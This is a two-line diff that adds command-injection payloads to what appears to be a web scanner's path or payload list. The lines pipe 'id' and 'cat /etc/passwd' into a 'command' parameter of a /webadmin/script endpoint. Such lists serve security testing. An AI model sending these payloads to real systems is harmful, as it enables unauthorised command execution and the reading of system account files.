@@ -1,0 +1,2 @@
+/webadmin/script?command=|id
+/webadmin/script?command=|cat%20/etc/passwd
